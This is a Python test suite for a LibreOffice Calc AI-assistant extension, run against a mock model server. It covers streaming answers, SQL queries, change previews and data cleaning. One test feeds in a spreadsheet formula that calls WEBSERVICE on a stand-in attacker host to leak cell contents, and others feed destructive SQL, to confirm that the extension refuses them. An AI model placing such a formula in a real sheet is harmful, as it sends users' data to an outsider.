"""Drives the installed extension against a mock CIU."""

import json
import os
import sys
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, ".."))

from lo_harness import Office, ROOT
import mock_ciu

OFFICE = None
SRV = None
TEST_OXT = os.path.join(ROOT, "dist", "ciu-libreoffice-test.oxt")


def setUpModule():
    global OFFICE, SRV
    SRV = mock_ciu.start()
    base = "http://127.0.0.1:%d" % SRV.server_address[1]
    if not os.environ.get("CIU_SKIP_INSTALL"):
        Office.install_shared(TEST_OXT)
    OFFICE = Office(port=2101).start(env={"CIU_BASE_URL": base})
    OFFICE.installed = OFFICE.installed()


def tearDownModule():
    OFFICE.stop()
    SRV.shutdown()


def wait_done(timeout=20):
    end = time.time() + timeout
    state = None
    while time.time() < end:
        state = json.loads(OFFICE.hook("poll"))
        if not state["busy"]:
            return state
        time.sleep(0.2)
    raise AssertionError("still busy: %r" % state)


class Extension(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.doc = OFFICE.new_calc()
        sheet = cls.doc.getSheets().getByIndex(0)
        sheet.getCellRangeByName("A1:B4").setDataArray(
            (("Item", "Cost"), ("Tea", 2.0), ("Milk", 1.5), ("Tea", 2.0)))
        sheet.getCellRangeByName("B5").setFormula("=SUM(B2:B4)")
        cls.doc.getCurrentController().select(sheet.getCellRangeByName("A1:B5"))
        cls.sheet = sheet

    def setUp(self):
        mock_ciu.STATE.__init__()

    def test_1_installed(self):
        self.assertIn("com.runciu.ciu.libreoffice", OFFICE.installed)

    def test_2_menu_registered(self):
        menus = OFFICE.config("/org.openoffice.Office.Addons/AddonUI/OfficeMenuBar")
        self.assertIn("com.runciu.ciu.menu", menus.getElementNames())
        sub = menus.getByName("com.runciu.ciu.menu").getByName("Submenu")
        urls = [sub.getByName(n).getByName("URL") for n in sub.getElementNames()]
        self.assertIn("service:com.runciu.ciu.Assistant?open", urls)

    def test_3_ask_streams_answer_through_main_thread(self):
        OFFICE.hook("open_and_ask:What is the total cost?")
        state = wait_done()
        self.assertEqual(state["answer"], "The selection has 3 rows. Total is =SUM(B2:B4).")
        self.assertIn("Connected | Qwen3.5-9B-Q4_K_M.gguf | 4096-token context", state["status"])
        self.assertIn("Sheet1!A1:B5, 5 x 2", state["scope"])
        self.assertTrue(state["ask_enabled"])
        self.assertFalse(state["stop_enabled"])
        req = mock_ciu.STATE.last_request
        user = req["messages"][1]["content"]
        self.assertIn("B (Cost): number", user)
        self.assertIn("all values: 'Tea' x2, 'Milk' x1", user)
        self.assertIn("Data rows: 3 (header row not counted, 1 total row not counted)", user)
        self.assertIn("B5: =SUM(B2:B4)", user)
        self.assertIn("Request: What is the total cost?", user)

    def test_4_stop_button(self):
        mock_ciu.STATE.reply = "word " * 300
        mock_ciu.STATE.chunk = 5
        mock_ciu.STATE.delay = 0.02
        OFFICE.hook("press:quick:0")
        time.sleep(0.6)
        mid = json.loads(OFFICE.hook("poll"))
        self.assertTrue(mid["busy"])
        self.assertTrue(mid["stop_enabled"])
        self.assertTrue(len(mid["answer"]) > 0)
        OFFICE.hook("press:stop")
        state = wait_done()
        self.assertTrue(state["answer"].endswith("[stopped]"))
        self.assertLess(len(state["answer"]), len("word " * 300))

    def test_4b_cut_off_and_looping_answers_are_labelled(self):
        mock_ciu.STATE.finish_reason = "length"
        OFFICE.hook("press:quick:0")
        state = wait_done()
        self.assertTrue(state["answer"].endswith("[answer cut off at the length limit]"))
        mock_ciu.STATE.__init__()
        mock_ciu.STATE.reply = ("Row 4 is Acme Ltd and row 7 is Acme Ltd as well. " * 6)
        OFFICE.hook("press:quick:1")
        state = wait_done()
        self.assertIn("[stopped: the answer was repeating itself", state["answer"])

    def test_4c_find_issues_sends_exact_scan(self):
        OFFICE.hook("press:quick:2")
        state = wait_done()
        user = mock_ciu.STATE.last_request["messages"][1]["content"]
        self.assertIn("Issues found by exact checks:", user)
        self.assertIn("Do not list every cell", user)
        self.assertEqual(len(mock_ciu.STATE.requests), 1)      # no SQL step for the buttons

    def test_5_model_not_loaded(self):
        mock_ciu.STATE.state = "stopped"
        OFFICE.hook("press:quick:2")
        state = wait_done()
        self.assertIn("no model is loaded", state["answer"])

    def test_6_server_error_shown(self):
        mock_ciu.STATE.http_error = (400, "This conversation has filled the 4096-token context.")
        OFFICE.hook("press:quick:1")
        state = wait_done()
        self.assertIn("4096-token context", state["answer"])

    def test_6_context_full_retries_with_fewer_rows(self):
        big = self.sheet.getCellRangeByName("H1:J300")
        big.setDataArray([("Name", "A", "B")] + [("n%d" % i, float(i * 123457), float(i)) for i in range(299)])
        ctrl = self.doc.getCurrentController()
        ctrl.select(big)
        self.addCleanup(lambda: (big.clearContents(1 | 4),
                                 ctrl.select(self.sheet.getCellRangeByName("A1:B5"))))

        def measure():
            OFFICE.hook("press:quick:0")
            return wait_done()
        mock_ciu.STATE.max_prompt_chars = None
        measure()
        full = sum(len(m["content"]) for m in mock_ciu.STATE.last_request["messages"])
        mock_ciu.STATE.__init__()
        mock_ciu.STATE.max_prompt_chars = full - 1
        state = measure()
        self.assertEqual(state["answer"], "The selection has 3 rows. Total is =SUM(B2:B4).")
        sizes = [sum(len(m["content"]) for m in r["messages"]) for r in mock_ciu.STATE.requests]
        self.assertEqual(len(sizes), 2)
        self.assertLess(sizes[1], sizes[0])

    def test_6_context_full_gives_up_after_retries(self):
        mock_ciu.STATE.max_prompt_chars = 10
        OFFICE.hook("press:quick:0")
        state = wait_done()
        self.assertIn("4096-token context", state["answer"])
        self.assertEqual(len(mock_ciu.STATE.requests), 3)

    def test_5a_question_runs_sql(self):
        sql = "SELECT item, cost FROM t ORDER BY cost DESC LIMIT 1"
        mock_ciu.STATE.plan_reply = json.dumps({"sql_needed": True, "sql": sql})
        OFFICE.hook("prompt:Which item costs the most?")
        OFFICE.hook("press:ask")
        state = wait_done()
        self.assertTrue(state["answer"].startswith("Computed with SQL: %s\n\n" % sql),
                        state["answer"])
        self.assertTrue(state["answer"].endswith("Total is =SUM(B2:B4)."))
        router, final = mock_ciu.STATE.requests
        self.assertIn("sql_needed", json.dumps(router["response_format"]))
        self.assertIn("Table t for SQL. Columns: row (sheet row number), item (Item; values: ",
                      router["messages"][1]["content"])
        self.assertNotIn("Milk", router["messages"][0]["content"])
        self.assertEqual(final["messages"][:2], router["messages"])
        last = final["messages"][-1]["content"]
        self.assertIn("Query result, computed exactly:", last)
        self.assertIn("item | cost\nTea | 2", last)
        self.assertIn("Total rows were left out.", last)

    def test_5b_question_without_query(self):
        mock_ciu.STATE.plan_reply = '{"sql_needed": false}'
        OFFICE.hook("prompt:What is in this table?")
        OFFICE.hook("press:ask")
        state = wait_done()
        self.assertEqual(state["answer"], "The selection has 3 rows. Total is =SUM(B2:B4).")
        self.assertIn("No query needed", mock_ciu.STATE.requests[-1]["messages"][-1]["content"])

    def test_5c_model_fixes_failed_sql(self):
        mock_ciu.STATE.plan_replies = [
            json.dumps({"sql_needed": True, "sql": "SELECT itm FROM t"}),
            json.dumps({"sql_needed": True, "sql": "SELECT COUNT(*) FROM t"})]
        OFFICE.hook("prompt:How many items?")
        OFFICE.hook("press:ask")
        state = wait_done()
        self.assertIn("Computed with SQL: SELECT COUNT(*) FROM t", state["answer"])
        first, retry, final = mock_ciu.STATE.requests
        self.assertIn("That failed: SQLite error: no such column: itm",
                      retry["messages"][-1]["content"])
        self.assertIn("COUNT(*)\n3", final["messages"][-1]["content"])

    def test_5d_gives_up_after_second_failure(self):
        mock_ciu.STATE.plan_reply = json.dumps({"sql_needed": True, "sql": "DELETE FROM t"})
        OFFICE.hook("prompt:Remove everything")
        OFFICE.hook("press:ask")
        state = wait_done()
        self.assertFalse(state["busy"])
        self.assertEqual(len(mock_ciu.STATE.requests), 3)
        self.assertIn("The query could not be run: SQLite error: not authorized",
                      mock_ciu.STATE.requests[-1]["messages"][-1]["content"])
        self.assertEqual(self.sheet.getCellRangeByName("B2").getValue(), 2.0)

    def test_5d2_change_typed_into_ask_is_proposed(self):
        mock_ciu.STATE.plan_replies = [
            '{"change_request": true}',
            json.dumps({"summary": "Add a Double column.", "operations": [
                {"tool": "fill_formula", "target": "C2:C4", "formula": "=B2*2"}]})]
        OFFICE.hook("prompt:Add a column with double the cost")
        OFFICE.hook("press:ask")
        state = wait_done()
        self.assertIn("Proposed change (not applied yet):", state["answer"])
        self.assertIn("C2: =B2*2, filled across C2:C4", state["answer"])
        self.assertTrue(state["pending"])
        router, plan_call = mock_ciu.STATE.requests
        self.assertIn("change_request", router["messages"][0]["content"])
        self.assertIn("operations", json.dumps(plan_call["response_format"]))
        self.assertEqual(self.sheet.getCellRangeByName("C2").getString(), "")
        OFFICE.hook("press:discard")

    def test_5e_clean_into_new_sheet(self):
        sql = ("SELECT item, cost FROM (SELECT *, ROW_NUMBER() OVER (PARTITION BY item "
               "ORDER BY row) AS n FROM t) WHERE n = 1 ORDER BY row")
        mock_ciu.STATE.plan_reply = json.dumps({"summary": "Remove duplicate items.", "operations": [
            {"tool": "sql_to_sheet", "sql": sql, "sheet": "Cleaned"}]})
        before = self.sheet.getCellRangeByName("A1:B5").getFormulaArray()
        OFFICE.hook("prompt:remove duplicates into a new sheet")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("sql_to_sheet", mock_ciu.STATE.last_request["messages"][0]["content"])
        self.assertIn("New sheet 'Cleaned': 2 rows x 2 columns, from 3 source rows (1 left out).\n"
                      "Leaves out: row 4: Tea.\n"
                      "Total rows are not copied (they would be out of date): row 5.", state["answer"])
        self.assertIn("The copy holds values, not formulas.", state["answer"])
        self.assertIn("Item | Cost\nTea | 2\nMilk | 1.5", state["answer"])
        self.assertIn("This sheet is not changed.", state["answer"])
        self.assertEqual(state["apply_label"], "Create sheet")
        self.assertEqual(self.doc.getSheets().getCount(), 1)

        OFFICE.hook("press:apply")
        state = json.loads(OFFICE.hook("poll"))
        self.assertIn("Created sheet 'Cleaned' with 2 rows", state["answer"])
        new = self.doc.getSheets().getByName("Cleaned")
        self.assertEqual(new.getCellRangeByName("A1:B4").getDataArray(),
                         (("Item", "Cost"), ("Tea", 2.0), ("Milk", 1.5), ("", "")))
        self.assertEqual(self.sheet.getCellRangeByName("A1:B5").getFormulaArray(), before)
        self.doc.getUndoManager().undo()
        self.assertEqual(self.doc.getSheets().getCount(), 1)
        self.doc.getCurrentController().setActiveSheet(self.sheet)
        self.doc.getCurrentController().select(self.sheet.getCellRangeByName("A1:B5"))

    def test_5f_bad_sheet_sql_reported(self):
        mock_ciu.STATE.plan_reply = json.dumps({"summary": "x", "operations": [
            {"tool": "sql_to_sheet", "sql": "DROP TABLE t"}]})
        OFFICE.hook("prompt:clean it")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("CIU's SQL could not be used, so nothing was changed:", state["answer"])
        self.assertIn("not authorized", state["answer"])
        self.assertFalse(state["pending"])
        self.assertEqual(self.doc.getSheets().getCount(), 1)

    def test_5g_clean_data(self):
        sheets = self.doc.getSheets()
        sheets.insertNewByName("Messy", sheets.getCount())
        messy = sheets.getByName("Messy")
        messy.getCellRangeByName("A1:C6").setDataArray((
            ("Invoice", "Paid", "Amount"), ("I1", "Yes", 10.0), ("I2", "Y", "TBC"),
            ("I3", "no", 7.0), ("I4", "No", "1,200"), ("I5", " Yes ", 2.0)))
        ctrl = self.doc.getCurrentController()
        ctrl.setActiveSheet(messy)
        ctrl.select(messy.getCellRangeByName("A1:C6"))
        mock_ciu.STATE.plan_reply = json.dumps({"columns": [
            {"column": "paid", "rules": [{"from": "Y", "to": "Yes"}, {"from": "Maybe", "to": "No"}]},
            {"column": "amount", "rules": [{"from": "TBC", "to": ""}]}]})
        try:
            OFFICE.hook("prompt:Clean data: TBC means unknown")
            OFFICE.hook("press:clean")
            state = wait_done()
            req = mock_ciu.STATE.last_request
            self.assertIn("columns", json.dumps(req["response_format"]))
            self.assertNotIn("TBC", req["messages"][0]["content"].replace("'TBC'", ""))
            user = req["messages"][1]["content"]
            self.assertIn("- paid (Paid, text): 'No' x2, 'Yes' x2, 'Y' x1", user)
            self.assertIn("- amount (Amount, number column; these cells are not numbers): 'TBC' x1", user)
            self.assertIn("Instructions from the user: TBC means unknown", user)
            answer = state["answer"]
            self.assertIn("a cleaned copy in a new sheet 'Cleaned', 5 rows x 3 columns", answer)
            self.assertIn("Changed in paid: 'Y' to 'Yes'.", answer)
            self.assertIn("Changed in amount: 'TBC' to empty.", answer)
            self.assertIn("Trimmed spaces in paid (1 cell).", answer)
            self.assertIn("amount: 1 number stored as text becomes a number.", answer)
            self.assertIn("paid 'Maybe': not a value in the column", answer)
            self.assertEqual(state["apply_label"], "Create sheet")
            OFFICE.hook("press:apply")
            new = sheets.getByName("Cleaned")
            self.assertEqual(new.getCellRangeByName("A1:C6").getDataArray(), (
                ("Invoice", "Paid", "Amount"), ("I1", "Yes", 10.0), ("I2", "Yes", ""),
                ("I3", "No", 7.0), ("I4", "No", 1200.0), ("I5", "Yes", 2.0)))
            self.assertEqual(messy.getCellRangeByName("B3").getString(), "Y")
        finally:
            for name in ("Cleaned", "Messy"):
                if sheets.hasByName(name):
                    sheets.removeByName(name)
            ctrl.setActiveSheet(self.sheet)
            ctrl.select(self.sheet.getCellRangeByName("A1:B5"))

    def test_5h_find_issues_suggests_clean(self):
        OFFICE.hook("press:quick:2")
        state = wait_done()
        self.assertNotIn("Tip: Clean data", state["answer"])

    def test_6a_propose_preview_apply(self):
        mock_ciu.STATE.plan_reply = json.dumps({
            "summary": "Add VAT column.", "operations": [
                {"tool": "set_values", "target": "C1", "values": [["With VAT"]]},
                {"tool": "fill_formula", "target": "C2:C4", "formula": "=ROUND(B2*1.2,2)"}]})
        OFFICE.hook("prompt:Add a column with 20% VAT")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("Proposed change (not applied yet):", state["answer"])
        self.assertIn("C2: =ROUND(B2*1.2;2), filled across C2:C4 (3 cells)", state["answer"])
        self.assertIn("Overwrites: nothing", state["answer"])
        self.assertIn("Results (calculated, not yet applied):\n  C2 = 2.4  (B2 = 2)", state["answer"])
        self.assertIn("  C3 = 1.8  (B3 = 1.5)", state["answer"])
        self.assertTrue(state["pending"] and state["apply_enabled"])
        self.assertEqual(self.sheet.getCellRangeByName("C2").getFormula(), "")
        req = mock_ciu.STATE.last_request
        self.assertIn("response_format", req)
        self.assertIn("First empty column to the right: C", req["messages"][1]["content"])

        OFFICE.hook("press:apply")
        state = json.loads(OFFICE.hook("poll"))
        self.assertIn("Applied 2 changes to 4 cells", state["answer"])
        self.assertFalse(state["apply_enabled"])
        self.assertEqual([self.sheet.getCellRangeByName("C%d" % r).getValue() for r in (2, 3, 4)],
                         [2.4, 1.8, 2.4])
        self.doc.getUndoManager().undo()
        self.assertEqual(self.sheet.getCellRangeByName("C1").getString(), "")

    def test_6b_overwrite_warning_then_discard(self):
        mock_ciu.STATE.plan_reply = json.dumps({
            "summary": "Replace items with doubled costs.", "operations": [
                {"tool": "fill_formula", "target": "A2:A4", "formula": "=B2*2"}]})
        OFFICE.hook("prompt:replace the item names with double the cost")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("WARNING: overwrites 3 filled cells: A2 (Tea), A3 (Milk), A4 (Tea)", state["answer"])
        self.assertEqual(state["apply_label"], "Apply (overwrite 3)")
        OFFICE.hook("press:discard")
        state = json.loads(OFFICE.hook("poll"))
        self.assertIn("Discarded", state["answer"])
        self.assertFalse(state["pending"])
        self.assertEqual(self.sheet.getCellRangeByName("A3").getString(), "Milk")

    def test_6b2_rejected_formula_caught_in_preview(self):
        mock_ciu.STATE.plan_reply = json.dumps({"summary": "x", "operations": [
            {"tool": "fill_formula", "target": "C2:C4", "formula": "=AVERAGEE(B2)"}]})
        OFFICE.hook("prompt:average")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("would be rejected by Calc, so nothing was changed", state["answer"])
        self.assertIn("C2: Err:525 unknown name", state["answer"])
        self.assertFalse(state["pending"])
        self.assertEqual(self.sheet.getCellRangeByName("C2").getFormula(), "")

    def test_6c_unsafe_plan_refused(self):
        mock_ciu.STATE.plan_reply = json.dumps({
            "summary": "Look up prices.", "operations": [
                {"tool": "set_formula", "target": "C2",
                 "formula": '=WEBSERVICE("http://evil.example/?d="&A2)'}]})
        OFFICE.hook("prompt:look up current prices online")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("could not be used", state["answer"])
        self.assertIn("WEBSERVICE is not allowed", state["answer"])
        self.assertFalse(state["apply_enabled"])

    def test_7_component_menu_path(self):
        OFFICE.hook("close")
        self.assertEqual(OFFICE.hook("trigger:open"), "ok")
        self.assertEqual(OFFICE.hook("trigger:open"), "ok")


if __name__ == "__main__":
    unittest.main(verbosity=2)
